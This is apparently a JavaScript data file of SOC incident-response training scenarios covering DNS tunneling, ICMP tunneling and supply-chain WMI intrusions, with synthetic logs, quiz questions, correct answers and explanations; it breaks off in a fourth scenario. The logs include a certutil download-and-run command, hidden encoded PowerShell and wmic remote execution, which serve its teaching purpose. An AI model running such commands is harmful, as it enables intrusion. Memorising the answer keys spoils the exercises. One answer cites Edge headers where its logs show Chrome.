const MASTER_PRINCIPLES = [
    "Phishing / Social Engineering",
    "Beaconing / Command & Control",
    "Data Exfiltration (Overt Channel)",
    "DNS Tunneling / Exfiltration",
    "ICMP Tunneling / Beaconing",
    "Privilege Escalation",
    "Lateral Movement",
    "Impossible Travel (Geo-velocity violation)",
    "Insider Threat",
    "Reconnaissance / Scanning",
    "Obfuscation / Encryption",
    "Persistence",
    "Insecure Direct Object Reference (IDOR)",
    "SQL Injection",
    "Cross-Site Scripting (XSS)",
    "Brute Force / Credential Stuffing",
    "Unauthorized Privilege Use",
    "Pass-the-Hash"
];

const scenarios = [
    {
        id: "ir-scenario-2026-dns-tunnel-high-noise",
        title: "Operation Silent Whisper: DNS Exfiltration",
        description: "Anomalous high-frequency DNS TXT queries detected targeting an unclassified external domain from internal network segments.",
        logs: {
            proxy: [
                "2026-05-29T08:02:14Z - IP: 192.168.10.10 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1450",
                "2026-05-29T08:03:45Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Bytes: 4092",
                "2026-05-29T08:15:22Z - IP: 192.168.10.45 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1420",
                "2026-05-29T08:16:10Z - IP: 192.168.10.45 - URL: https://outlook.office.com/mapi - Action: Allowed - Category: Business/Collaboration - Bytes: 8940",
                "2026-05-29T08:30:00Z - IP: 192.168.10.12 - URL: https://teams.microsoft.com - Action: Allowed - Category: Business/Collaboration - Bytes: 12450",
                "2026-05-29T09:12:33Z - IP: 192.168.10.33 - URL: https://bamboohr.com/login - Action: Allowed - Category: HR/Business - Bytes: 6300",
                "2026-05-29T09:45:12Z - IP: 192.168.10.14 - URL: https://github.com/company-org/repo/pulls - Action: Allowed - Category: IT/Development - Bytes: 15320",
                "2026-05-29T10:15:00Z - IP: 192.168.10.10 - URL: https://canva.com/design - Action: Allowed - Category: Media/Arts - Bytes: 452000",
                "2026-05-29T11:30:22Z - IP: 192.168.10.12 - URL: https://spotify.com/play - Action: Allowed - Category: Streaming Media - Bytes: 1205000",
                "2026-05-29T12:00:45Z - IP: 192.168.10.33 - URL: https://doordash.com - Action: Allowed - Category: Shopping - Bytes: 4230",
                "2026-05-29T13:14:10Z - IP: 192.168.10.14 - URL: https://stackoverflow.com/questions - Action: Allowed - Category: IT/Development - Bytes: 8400",
                "2026-05-29T14:00:02Z - IP: 192.168.10.12 - URL: https://teams.microsoft.com - Action: Allowed - Category: Business/Collaboration - Bytes: 13500",
                "2026-05-29T14:05:32Z - IP: 192.168.10.45 - URL: http://global-policies-review.com/update.html - Action: Allowed - Category: Uncategorized - Bytes: 450",
                '2026-05-29T14:06:00Z - IP: 192.168.10.45 - Proto: UDP/53 - Query: TXT - Name: 01A9F3D4.cdn-cache-update.top - Status: SUCCESS - Response: TXT "ok"',
                '2026-05-29T14:06:31Z - IP: 192.168.10.45 - Proto: UDP/53 - Query: TXT - Name: 02B8E2C1.cdn-cache-update.top - Status: SUCCESS - Response: TXT "ok"',
                '2026-05-29T14:07:02Z - IP: 192.168.10.45 - Proto: UDP/53 - Query: TXT - Name: 03C7D1B0.cdn-cache-update.top - Status: SUCCESS - Response: TXT "cmd:whoami"',
                "2026-05-29T14:10:45Z - IP: 192.168.10.15 - URL: https://www.google.com/search?q=weather - Action: Allowed - Category: Search Engine - Bytes: 1200",
                '2026-05-29T14:15:00Z - IP: 192.168.10.45 - Proto: UDP/53 - Query: TXT - Name: 04E6C0A9.cdn-cache-update.top - Status: SUCCESS - Response: TXT "cmd:sc_query"',
                '2026-05-29T14:16:12Z - IP: 192.168.10.49 - Proto: UDP/53 - Query: TXT - Name: 01F5E4D3.cdn-cache-update.top - Status: SUCCESS - Response: TXT "ok"',
                '2026-05-29T14:16:42Z - IP: 192.168.10.49 - Proto: UDP/53 - Query: TXT - Name: 02A1C9B4.cdn-cache-update.top - Status: SUCCESS - Response: TXT "ok"',
                '2026-05-29T14:17:00Z - IP: 192.168.10.45 - Proto: UDP/53 - Query: TXT - Name: 05A7B3F8.cdn-cache-update.top - Status: SUCCESS - Response: TXT "ok"',
                "2026-05-29T14:25:30Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Bytes: 3100"
            ],
            email: [
                "2026-05-29T08:00:10Z - Inbound - From: notifications@slack.com - To: asmith@company.com - Subject: You have unread messages in General - Status: Delivered",
                "2026-05-29T08:20:45Z - Inbound - From: alerts@bamboohr.com - To: mrogers@company.com - Subject: Time Off Request Pending Approval - Status: Delivered",
                "2026-05-29T09:05:12Z - Outbound - From: asmith@company.com - To: client-external@globalpartner.com - Subject: RE: Campaign Launch Assets - Status: Sent",
                "2026-05-29T11:15:00Z - Inbound - From: phish-test@company.com - To: rjones@company.com - Subject: Security Alert: Unauthorized Login Detected - Status: Delivered",
                "2026-05-29T13:45:22Z - Inbound - From: newsletters@techcrunch.com - To: asmith@company.com - Subject: TechCrunch Daily - Status: Delivered",
                "2026-05-29T14:01:10Z - Inbound - From: hr-update@global-policies-review.com - To: jdoe@company.com - Subject: URGENT: Revised 2026 Remote Work Policy - Status: Delivered",
                "2026-05-29T14:08:15Z - Inbound - From: noreply@github.com - To: dev-team@company.com - Subject: [GitHub] Security Alert - Status: Delivered",
                "2026-05-29T14:30:00Z - Outbound - From: mrogers@company.com - To: candidates-external@jobmail.com - Subject: Interview Schedule - Status: Sent"
            ],
            file_server: [
                "2026-05-29T08:30:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
                "2026-05-29T08:31:02Z - Object Accessed: \\\\FILE-SRV-01\\Public\\Templates\\Corporate_Theme.potx - Accesses: ReadData - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
                "2026-05-29T09:00:05Z - Share Name: \\\\FILE-SRV-01\\IPC$ - Access Request: Allowed - Source IP: 192.168.10.12 - User: COMPANY\\fsmith",
                "2026-05-29T09:15:20Z - Share Name: \\\\FILE-SRV-01\\Finance - Access Request: Allowed - Source IP: 192.168.10.12 - User: COMPANY\\fsmith",
                "2026-05-29T10:45:11Z - Share Name: \\\\FILE-SRV-01\\HR - Access Request: Allowed - Source IP: 192.168.10.33 - User: COMPANY\\mrogers",
                "2026-05-29T10:45:55Z - Object Accessed: \\\\FILE-SRV-01\\HR\\Onboarding\\FormI9_Blank.pdf - Accesses: ReadData - Source IP: 192.168.10.33 - User: COMPANY\\mrogers",
                "2026-05-29T14:10:15Z - Share Name: \\\\FILE-SRV-01\\Finance - Access Request: Allowed - Source IP: 192.168.10.45 - User: LOCALRESOURCE\\admin-svc",
                "2026-05-29T14:11:02Z - Object Accessed: \\\\FILE-SRV-01\\Finance\\2026_Q2_Forecast.xlsx - Accesses: ReadData - Source IP: 192.168.10.45 - User: LOCALRESOURCE\\admin-svc",
                "2026-05-29T14:22:10Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.15 - User: COMPANY\\mrogers"
            ],
            workstations: [
                "2026-05-29T08:01:22Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: explorer.exe spawned slack.exe --startup",
                "2026-05-29T08:15:55Z - WKSTN-04 (192.168.10.45) - EventID: 4688 - Process Created: explorer.exe spawned outlook.exe",
                '2026-05-29T08:46:00Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: explorer.exe spawned excel.exe "\\\\FILE-SRV-01\\Finance\\Ledger2026.xlsx"',
                "2026-05-29T09:31:05Z - WKSTN-03 (192.168.10.14) - EventID: 4688 - Process Created: explorer.exe spawned chrome.exe --restore-last-session",
                "2026-05-29T10:00:00Z - WKSTN-04 (192.168.10.45) - EventID: 4800 - Workstation Locked - User: COMPANY\\jdoe",
                "2026-05-29T11:00:00Z - WKSTN-04 (192.168.10.45) - EventID: 4801 - Workstation Unlocked - User: COMPANY\\jdoe",
                "2026-05-29T14:05:30Z - WKSTN-04 (192.168.10.45) - EventID: 4688 - Process Created: outlook.exe spawned chrome.exe --url http://global-policies-review.com/update.html",
                "2026-05-29T14:05:45Z - WKSTN-04 (192.168.10.45) - EventID: 4688 - Process Created: chrome.exe spawned powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...",
                "2026-05-29T14:14:55Z - WKSTN-02 (192.168.10.12) - EventID: 7036 - Service Status Change: Windows Update Service entered the running state.",
                "2026-05-29T14:15:40Z - WKSTN-09 (192.168.10.49) - EventID: 4688 - Process Created: services.exe spawned powershell.exe -WindowStyle Hidden -NoProfile -Command [System.Text.Encoding]::UTF8.GetString...",
                "2026-05-29T14:30:12Z - WKSTN-01 (192.168.10.10) - EventID: 4800 - Workstation Locked - User: COMPANY\\asmith"
            ],
            auth_logs: [
                "2026-05-29T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith - Logon Type: 2 (Interactive)",
                "2026-05-29T08:15:15Z - IdP_Auth - User: jdoe@company.com - App: Exchange Online - AuthMethod: Password+MFA - Status: Success - Agent: Microsoft Outlook for Windows",
                "2026-05-29T08:15:32Z - WKSTN-04 (192.168.10.45) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe - Logon Type: 2 (Interactive)",
                "2026-05-29T08:45:10Z - WKSTN-02 (192.168.10.12) - EventID: 4624 - Successful Logon - User: COMPANY\\fsmith - Logon Type: 2 (Interactive)",
                "2026-05-29T09:30:12Z - WKSTN-03 (192.168.10.14) - EventID: 4624 - Successful Logon - User: COMPANY\\rjones - Logon Type: 2 (Interactive)",
                "2026-05-29T14:12:00Z - WKSTN-04 (192.168.10.45) - EventID: 4624 - Successful Logon - User: LOCALRESOURCE\\admin-svc - Logon Type: 3 (Network)",
                "2026-05-29T14:15:22Z - WKSTN-09 (192.168.10.49) - EventID: 4624 - Successful Network Logon - Source IP: 192.168.10.45 - User: LOCALRESOURCE\\admin-svc - Logon Type: 3 (Network)"
            ]
        },
        questions: {
            vector: {
                label: "What was the initial infection vector used to breach the environment?",
                type: "select",
                options: [
                    "Drive-by Download via Compromised Forum",
                    "Phishing Link via External Email",
                    "Exploitation of Public-Facing Edge Firewall",
                    "Malicious USB Drop / Insider Threat"
                ],
                correct: "Phishing Link via External Email"
            },
            origin: {
                label: "Which asset is identified as Patient Zero (Point of Origin)?",
                type: "select",
                options: [
                    "WKSTN-01",
                    "WKSTN-02",
                    "WKSTN-04",
                    "WKSTN-09"
                ],
                correct: "WKSTN-04"
            },
            count: {
                label: "How many endpoints are confirmed actively infected/compromised with the malware payload?",
                type: "number",
                correct: 2
            },
            beaconing: {
                label: "What method is the adversary using for Command and Control (C2) beaconing and data harvesting?",
                type: "select",
                options: [
                    "ICMP Echo Request Tunneling (Oversized Payloads)",
                    "HTTPS POST Request beacons via Web Gateway",
                    "DNS TXT Query Subdomain Encrypted Tunneling",
                    "Direct SSH Outbound Connection over Port 22"
                ],
                correct: "DNS TXT Query Subdomain Encrypted Tunneling"
            }
        },
        principles: ["Phishing / Social Engineering", "DNS Tunneling / Exfiltration", "Lateral Movement", "Beaconing / Command & Control"],
        explanation: "An analysis of the mail exchange logs indicates that an inbound phishing email from the lookalike domain 'global-policies-review.com' arrived at 14:01:10Z targeting user 'jdoe'. Forensic endpoint event logs reveal that at 14:05:30Z, the user on WKSTN-04 executed the link via Outlook, which subsequently spawned an obfuscated PowerShell session. This endpoint immediately began beaconing out via DNS TXT queries to the anomalous external domain 'cdn-cache-update.top' in 30-second increments. At 14:15:22Z, network event logs trace lateral movement via SMB/RPC from WKSTN-04 to WKSTN-09 using a compromised local service administrator account ('admin-svc'). WKSTN-09 immediately initiated its own high-frequency DNS TXT beaconing behavior, bringing the total number of infected hosts to 2. While FILE-SRV-01 observed unauthorized access and credential testing from WKSTN-04, no active execution payload was run on the server itself. Other telemetry records benign administrative, development, and daily operational activities of unaffected users (such as asmith, fsmith, rjones, and mrogers) to simulate a standard production network environment."
    },
    {
        id: "ir-scenario-2026-icmp-tunnel",
        title: "Operation Dark Echo: ICMP Tunneling",
        description: "Unusual volume of high-payload ICMP Echo Requests observed communicating with an unclassified external IP address.",
        logs: {
            proxy: [
                "2026-05-29T08:02:14Z - IP: 192.168.10.10 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1450",
                "2026-05-29T08:03:45Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Bytes: 4092",
                "2026-05-29T08:05:22Z - IP: 192.168.10.14 - URL: https://github.com/company-org/repo - Action: Allowed - Category: IT/Development - Bytes: 12300",
                "2026-05-29T08:15:32Z - IP: 192.168.10.112 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1410",
                "2026-05-29T08:16:45Z - IP: 192.168.10.112 - URL: https://outlook.office.com/mapi - Action: Allowed - Category: Business/Collaboration - Bytes: 8940",
                "2026-05-29T08:22:20Z - IP: 192.168.10.112 - URL: http://198.51.100.42/sysprep_patch.exe - Action: Allowed - Category: IP-Address-Direct - Bytes: 2450000",
                "2026-05-29T08:30:00Z - IP: 192.168.10.12 - URL: https://teams.microsoft.com - Action: Allowed - Category: Business/Collaboration - Bytes: 12450",
                "2026-05-29T08:40:00Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T08:40:15Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T08:40:30Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T08:45:12Z - IP: 192.168.10.14 - URL: https://stackoverflow.com/questions - Action: Allowed - Category: IT/Development - Bytes: 7800",
                "2026-05-29T08:50:00Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T08:55:40Z - IP: 192.168.10.112 - Proto: TCP/5985 (WinRM) - Dest: 192.168.10.115 - Action: Allowed - Internal Traffic",
                "2026-05-29T09:02:40Z - IP: 192.168.10.115 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T09:02:55Z - IP: 192.168.10.115 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T09:05:00Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T09:12:00Z - IP: 192.168.10.10 - URL: https://canva.com/design - Action: Allowed - Category: Media/Arts - Bytes: 320000"
            ],
            email: [
                "2026-05-29T08:00:10Z - Inbound - From: notifications@slack.com - To: asmith@company.com - Subject: Daily Team Sync - Status: Delivered",
                "2026-05-29T08:15:30Z - Inbound - From: invoice-service@vendor-billing-portal.com - To: tturner@company.com - Subject: Outstanding_Invoice_Q2 - Attachment: Outstanding_Invoice_Q2.pdf - Status: Delivered",
                "2026-05-29T08:45:00Z - Inbound - From: alerts@bamboohr.com - To: tturner@company.com - Subject: Review Request Submitted - Status: Delivered",
                "2026-05-29T09:15:00Z - Outbound - From: fsmith@company.com - To: payroll-external@taxpartner.com - Subject: Audited Q2 Payroll Ledger - Status: Sent"
            ],
            file_server: [
                "2026-05-29T08:20:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
                "2026-05-29T08:32:02Z - Share Name: \\\\FILE-SRV-01\\Finance - Access Request: Allowed - Source IP: 192.168.10.12 - User: COMPANY\\fsmith",
                "2026-05-29T08:35:10Z - Object Accessed: \\\\FILE-SRV-01\\Archive\\2026_Tax_Disclosures.zip - Accesses: ReadData - Source IP: 192.168.10.112 - User: COMPANY\\tturner",
                "2026-05-29T08:50:00Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.15 - User: COMPANY\\jdoe"
            ],
            workstations: [
                "2026-05-29T08:07:12Z - WKSTN-03 (192.168.10.14) - Command executed: ping 192.168.10.1 -n 4 - Payload Size: 32 bytes",
                "2026-05-29T08:15:10Z - WKSTN-12 (192.168.10.112) - EventID: 4688 - Process Created: explorer.exe spawned outlook.exe",
                "2026-05-29T08:22:15Z - WKSTN-12 (192.168.10.112) - EventID: 4688 - Process Created: outlook.exe spawned Acrobat.exe --open Outstanding_Invoice_Q2.pdf",
                "2026-05-29T08:22:18Z - WKSTN-12 (192.168.10.112) - EventID: 4688 - Process Created: Acrobat.exe spawned cmd.exe /c certutil.exe -urlcache -f http://198.51.100.42/sysprep_patch.exe C:\\Windows\\Temp\\sysprep_patch.exe",
                "2026-05-29T08:24:00Z - WKSTN-12 (192.168.10.112) - EventID: 4688 - Process Created: cmd.exe spawned C:\\Windows\\Temp\\sysprep_patch.exe",
                '2026-05-29T09:02:30Z - WKSTN-15 (192.168.10.115) - EventID: 4688 - Process Created: wsmprovhost.exe spawned powershell.exe -WindowStyle Hidden -Command "[System.Net.NetworkInformation.Ping]::new().Send(\'203.0.113.84\', ...)"'
            ],
            auth_logs: [
                "2026-05-29T08:05:00Z - WKSTN-03 (192.168.10.14) - EventID: 4624 - Successful Logon - User: COMPANY\\rjones - Logon Type: 2 (Interactive)",
                "2026-05-29T08:12:00Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith - Logon Type: 2 (Interactive)",
                "2026-05-29T08:14:50Z - IdP_Auth - User: tturner@company.com - App: Exchange Online - AuthMethod: Password+MFA - Status: Success - Agent: Microsoft Outlook for Windows",
                "2026-05-29T08:14:55Z - WKSTN-12 (192.168.10.112) - EventID: 4624 - Successful Logon - User: COMPANY\\tturner - Logon Type: 2 (Interactive)",
                "2026-05-29T08:30:15Z - WKSTN-02 (192.168.10.12) - EventID: 4624 - Successful Logon - User: COMPANY\\fsmith - Logon Type: 2 (Interactive)",
                "2026-05-29T08:55:10Z - WKSTN-15 (192.168.10.115) - EventID: 4624 - Successful Network Logon - Source IP: 192.168.10.112 - User: COMPANY\\Administrator - Logon Type: 3 (Network via WinRM)"
            ]
        },
        questions: {
            vector: {
                label: "What was the initial entry mechanism (attack vector) used to breach the corporate environment?",
                type: "select",
                options: [
                    "Unauthenticated Remote Code Execution over VPN",
                    "Phishing Email with Malicious Attachment",
                    "Compromised Software Update Package (Supply Chain)",
                    "Social Engineering leading to Credential Harvesting"
                ],
                correct: "Phishing Email with Malicious Attachment"
            },
            origin: {
                label: "Identify Patient Zero (Point of Origin) where the initial payload was downloaded and executed:",
                type: "select",
                options: [
                    "WKSTN-03",
                    "WKSTN-01",
                    "WKSTN-12",
                    "WKSTN-15"
                ],
                correct: "WKSTN-12"
            },
            count: {
                label: "How many endpoint systems show evidence of active compromise/C2 exfiltration?",
                type: "number",
                correct: 2
            },
            beaconing: {
                label: "Which protocol and anomalous traffic characteristic are used by the attacker for stealth exfiltration?",
                type: "select",
                options: [
                    "DNS TXT Query Subdomain Encrypted Tunneling",
                    "Oversized Outbound ICMP Echo Requests (1450 Bytes)",
                    "Outbound WinRM Management Shell Traffic on TCP 5985",
                    "Direct SSH File Exfiltration using Encoded Keys"
                ],
                correct: "Oversized Outbound ICMP Echo Requests (1450 Bytes)"
            },
            lateral_movement: {
                label: "Which native administrative protocol was leveraged to execute lateral movement from Patient Zero?",
                type: "select",
                options: [
                    "Remote Desktop Protocol (RDP) on TCP 3389",
                    "Server Message Block (SMB) administrative shares",
                    "Windows Remote Management (WinRM) on TCP 5985",
                    "WMI execution via Win32_Process class"
                ],
                correct: "Windows Remote Management (WinRM) on TCP 5985"
            }
        },
        principles: ["Phishing / Social Engineering", "ICMP Tunneling / Beaconing", "Lateral Movement", "Beaconing / Command & Control"],
        explanation: "An analysis of incoming email telemetry indicates that at 08:15:30Z, user 'tturner' on WKSTN-12 received a phishing message containing a PDF invoice attachment. Upon opening the PDF at 08:22:15Z, an Adobe exploit launched a hidden shell command leveraging certutil.exe to download 'sysprep_patch.exe' from an external IP staging server. The malware used ICMP Tunneling to bypass traditional web proxies by wrapping stolen data into 1450-byte Echo Requests directed to 203.0.113.84. After staging and exfiltrating '2026_Tax_Disclosures.zip' from the FILE-SRV-01 archive folder, the attacker harvested credentials from LSASS and successfully pivoted laterally to WKSTN-15 at 08:55:10Z using Windows Remote Management (WinRM / TCP port 5985), leading to a secondary payload activation. Meanwhile, background noise from other users (such as rjones troubleshooting network routes using legitimate, normal 32-byte internal pings) provides the typical administrative distraction present in real-world SOC workflows."
    },
    {
        id: "ir-scenario-2026-supply-chain-wmi",
        title: "Operation Poisoned Update",
        description: "Unusual outbound web gateway requests matching outdated User-Agent signatures observed alongside lateral WMI execution.",
        logs: {
            proxy: [
                "2026-05-29T09:02:14Z - IP: 192.168.10.121 - URL: https://chrome.google.com/webstore - Action: Allowed - Category: Software/Updates - Bytes: 12500",
                "2026-05-29T09:05:45Z - IP: 192.168.10.122 - URL: https://github.com/pipelines/build - Action: Allowed - Category: IT/Development - Bytes: 45092",
                "2026-05-29T09:12:40Z - IP: 192.168.10.125 - URL: http://soft-update-portal.net/extension/update.json - Action: Allowed - Category: Uncategorized - Bytes: 512",
                "2026-05-29T09:15:30Z - IP: 192.168.10.121 - URL: https://clients2.google.com/service/update2 - Action: Allowed - Category: Software/Updates - Bytes: 3410",
                "2026-05-29T09:18:05Z - IP: 192.168.10.125 - URL: http://soft-update-portal.net/bin/pdf_helper_service.exe - Action: Allowed - Category: Uncategorized - Bytes: 4520000",
                "2026-05-29T09:20:00Z - IP: 192.168.10.125 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1042",
                "2026-05-29T09:25:00Z - IP: 192.168.10.125 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1042",
                "2026-05-29T09:30:00Z - IP: 192.168.10.125 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1042",
                "2026-05-29T09:35:12Z - IP: 192.168.10.122 - URL: https://stackoverflow.com - Action: Allowed - Category: IT/Development - Bytes: 8800",
                "2026-05-29T09:48:20Z - IP: 192.168.10.125 - Proto: TCP/135 (DCE/RPC) - Dest: 192.168.10.128 - Action: Allowed - Internal Traffic",
                "2026-05-29T09:48:22Z - IP: 192.168.10.125 - Proto: TCP/445 (SMB-WMI) - Dest: 192.168.10.128 - Action: Allowed - Internal Traffic",
                "2026-05-29T09:55:00Z - IP: 192.168.10.128 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1250",
                "2026-05-29T10:00:00Z - IP: 192.168.10.128 - URL: http://185.190.140.12/api/v1/telemetry - Action: Allowed - UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/99.0.4844.84 - Bytes: 1250"
            ],
            email: [
                "2026-05-29T09:00:10Z - Inbound - From: notifications@slack.com - To: mjenkins@company.com - Subject: Direct Message Notification - Status: Delivered",
                "2026-05-29T09:10:00Z - Inbound - From: newsletter@techtrends.com - To: jdoe@company.com - Subject: Weekly Technology Brief - Status: Delivered"
            ],
            file_server: [
                "2026-05-29T09:14:22Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.121 - User: COMPANY\\mjenkins",
                "2026-05-29T09:38:15Z - Object Accessed: \\\\FILE-SRV-01\\HR\\Active_Employees_PII.csv - Accesses: ReadData - Source IP: 192.168.10.125 - User: COMPANY\\dom-admin",
                "2026-05-29T09:42:00Z - Share Name: \\\\FILE-SRV-01\\DevShare - Access Request: Allowed - Source IP: 192.168.10.122 - User: COMPANY\\kbaker"
            ],
            workstations: [
                '2026-05-29T08:52:10Z - WKSTN-23 (192.168.10.123) - Command executed: Powershell.exe -Command "1..254 | % {test-connection 192.168.10.$_ -count 1 -quiet}" - Note: Benign internal inventory scan',
                "2026-05-29T09:12:40Z - WKSTN-25 (192.168.10.125) - EventID: 4688 - Process Created: explorer.exe spawned chrome.exe",
                "2026-05-29T09:18:05Z - WKSTN-25 (192.168.10.125) - EventID: 4688 - Process Created: chrome.exe spawned C:\\Windows\\Temp\\pdf_helper_service.exe",
                "2026-05-29T09:35:10Z - WKSTN-25 (192.168.10.125) - EventID: 4688 - Process Created: C:\\Windows\\Temp\\pdf_helper_service.exe spawned lsass.exe (Access Granted: 0x1410)",
                '2026-05-29T09:48:20Z - WKSTN-25 (192.168.10.125) - EventID: 4688 - Process Created: pdf_helper_service.exe spawned wmic.exe /node:192.168.10.128 process call create "powershell.exe -enc SQBFAFgAK..."',
                '2026-05-29T09:55:00Z - WKSTN-28 (192.168.10.128) - EventID: 4688 - Process Created: WmiPrvSE.exe spawned powershell.exe -WindowStyle Hidden -Command "[System.Net.HttpWebRequest]::Create(\'http://185.190.140.12/...\').GetResponse()"'
            ],
            auth_logs: [
                "2026-05-29T08:45:00Z - WKSTN-23 (192.168.10.123) - EventID: 4624 - Successful Logon - User: COMPANY\\tcollins - Logon Type: 2 (Interactive)",
                "2026-05-29T09:00:15Z - WKSTN-21 (192.168.10.121) - EventID: 4624 - Successful Logon - User: COMPANY\\mjenkins - Logon Type: 2 (Interactive)",
                "2026-05-29T09:01:22Z - IdP_Auth - User: jdoe@company.com - App: O365 Portal - AuthMethod: Password - Status: Success - Agent: Chrome Browser (Windows)",
                "2026-05-29T09:05:00Z - WKSTN-22 (192.168.10.122) - EventID: 4624 - Successful Logon - User: COMPANY\\kbaker - Logon Type: 2 (Interactive)",
                "2026-05-29T09:12:35Z - WKSTN-25 (192.168.10.125) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe - Logon Type: 2 (Interactive)",
                "2026-05-29T09:48:22Z - WKSTN-28 (192.168.10.128) - EventID: 4624 - Successful Network Logon - Source IP: 192.168.10.125 - User: COMPANY\\dom-admin - Logon Type: 3 (Network via WMI)"
            ]
        },
        questions: {
            vector: {
                label: "What was the initial entry mechanism (attack vector) used to breach the environment?",
                type: "select",
                options: [
                    "Unauthenticated Edge Gateway VPN exploitation",
                    "Social Engineering Phishing Link click",
                    "Compromised Browser Extension (Supply Chain Compromise)",
                    "Drive-By Download on a compromised industry forum"
                ],
                correct: "Compromised Browser Extension (Supply Chain Compromise)"
            },
            origin: {
                label: "Identify the endpoint system where the initial malicious payload was executed (Patient Zero):",
                type: "select",
                options: [
                    "WKSTN-21",
                    "WKSTN-22",
                    "WKSTN-25",
                    "WKSTN-28"
                ],
                correct: "WKSTN-25"
            },
            count: {
                label: "How many corporate workstations show telemetry confirming active host infection and ongoing C2 exfiltration?",
                type: "number",
                correct: 2
            },
            beaconing: {
                label: "What is the primary indicator used to identify malicious web gateway requests against benign traffic?",
                type: "select",
                options: [
                    "High-payload ICMP Echo Requests sent to an internal DNS server",
                    "Outbound HTTP POST requests mimicking Edge browser headers with an outdated User-Agent",
                    "High-frequency DNS TXT record requests to lookalike external subdomains",
                    "Direct unauthorized SSH file transfers over TCP Port 22"
                ],
                correct: "Outbound HTTP POST requests mimicking Edge browser headers with an outdated User-Agent"
            },
            lateral_movement: {
                label: "Which protocol/service was leveraged by the threat actor to execute remote commands laterally?",
                type: "select",
                options: [
                    "Windows Remote Management (WinRM) over TCP 5985",
                    "Remote Desktop Protocol (RDP) over TCP 3389",
                    "Server Message Block (SMB) administrative shared folders",
                    "Windows Management Instrumentation (WMI) over TCP 135/445"
                ],
                correct: "Windows Management Instrumentation (WMI) over TCP 135/445"
            }
        },
        principles: ["Lateral Movement", "Beaconing / Command & Control", "Obfuscation / Encryption", "Privilege Escalation"],
        explanation: "At 09:12:40Z, a compromised open-source browser extension updated inside the Google Chrome browser context of user 'jdoe' on WKSTN-25. At 09:18:05Z, this extension spawned 'pdf_helper_service.exe', establishing standard HTTP POST beaconing sequences to 185.190.140.12. To blend in, these requests utilized normal HTTP formatting, but were distinguishable by an outdated Chrome/99 User-Agent string. The attacker dumped credentials from LSASS and successfully hijacked the active 'dom-admin' session. At 09:48:20Z, the attacker used 'wmic.exe' to execute a lateral remote invocation sweep on WKSTN-28 over WMI ports (TCP 135/445), dropping an obfuscated PowerShell agent that initiated a secondary outbound beacon. Benign administrative activities, such as helpdesk personnel 'tcollins' executing a routine network inventory search via loop commands, were deliberately interspersed to challenge the analyst's event correlation."
    },
    {
        id: "ir-scenario-2026-insider-exfil",
        title: "Operation Parting Gift",
        description: "Critical data exfiltration alert triggered by a high-volume outbound upload to an unclassified file sharing host immediately following an HR change event.",
        logs: {
            proxy: [
                "2026-05-29T08:02:14Z - IP: 192.168.10.10 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1450",
                "2026-05-29T08:03:45Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Bytes: 4092",
